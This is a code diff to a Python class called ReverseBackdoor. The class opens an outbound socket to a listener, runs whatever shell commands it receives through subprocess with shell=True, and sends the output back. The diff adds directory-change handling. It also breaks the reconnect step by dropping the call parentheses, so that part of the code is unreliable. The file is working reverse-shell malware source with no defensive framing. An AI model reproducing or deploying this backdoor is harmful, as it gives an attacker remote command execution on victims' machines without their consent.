@@ -3,6 +3,8 @@ import socket
 import subprocess
 import json
 import sys
+import os
+
 
 class ReverseBackdoor:
 	def __init__(self, ip:str, port:int)->None:
@@ -30,7 +32,7 @@ class ReverseBackdoor:
 		serialize data and send over TCP socket.
 		'''
 		bytes_json_data = json.dumps(data).encode('utf-8')
-		# print('Backdoor sent: ',bytes_json_data)
+		# print('BD sent: ',bytes_json_data)
 		self.connection.send(bytes_json_data)
 
 
@@ -57,6 +59,14 @@ class ReverseBackdoor:
 		return subprocess.check_output(command, shell=True).decode('utf-8')
 
 
+	def cwd(self,path):
+		'''
+		change working directory to the passed path.
+		'''
+		os.chdir(path)
+		return '[*] Path changed to ' + path
+
+
 	def run(self):
 		while True:
 			try:
@@ -64,16 +74,21 @@ class ReverseBackdoor:
 				
 				# remove below line
 				command_lst = command.split(' ')
+				# print(command_lst)
 				if command_lst[0] == 'exit':
 					self.connection.close()
 					sys.exit()
+				elif command_lst[0] == 'cd' and len(command_lst)==2:
+					cwd_path = command_lst[1]
+					command_output = self.cwd(cwd_path)
+				else:
+					command_output = self.execute_command(command)
 
-				command_output = self.execute_command(command)
 				self.serial_send(command_output)
 
 			except json.JSONDecodeError:
 				print('[-] Lost Connection.')
-				self.connect_to_listener()
+				self.connect_to_listener
 
 			except Exception as e:
 				exception = ('[-] Exception : ' + str(e))
